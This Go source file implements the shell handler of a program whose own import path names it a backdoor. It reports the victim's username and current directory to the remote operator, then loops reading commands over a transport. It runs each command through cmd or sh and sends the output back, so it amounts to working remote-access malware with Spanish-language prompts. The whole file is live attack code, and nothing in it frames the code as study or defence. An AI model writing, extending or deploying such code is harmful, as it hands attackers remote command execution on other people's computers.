package handler

import (
	"backdoor/transport"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func ShellHandler(t transport.Transport) {
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER") // Linux/macOS fallback
	}

	cwd, _ := os.Getwd()

	header := fmt.Sprintf("[*] Usuario: %s\n[*] Directorio: %s\n", username, cwd)
	t.Write([]byte(header))

	t.Write([]byte("Shell activa. Escribe comandos:\n"))

	for {
		cwd, _ = os.Getwd()
		prompt := fmt.Sprintf("[%s]> ", cwd)
		t.Write([]byte(prompt))

		input, err := t.Read()
		if err != nil {
			return
		}

		cmd := strings.TrimSpace(string(input))
		if cmd == "exit" {
			t.Write([]byte("Saliendo de shell\n"))
			break
		}

		parts := strings.Split(cmd, " ")
		if parts[0] == "cd" && len(parts) > 1 {
			err := os.Chdir(parts[1])
			if err != nil {
				t.Write([]byte("Error cambiando directorio\n"))
			}
			continue
		}

		var out bytes.Buffer
		command := exec.Command("cmd", "/C", cmd)
		if os.Getenv("SHELL") != "" { // Si no estás en Windows
			command = exec.Command("sh", "-c", cmd)
		}

		command.Stdout = &out
		command.Stderr = &out
		command.Run()
		t.Write(out.Bytes())
	}
}
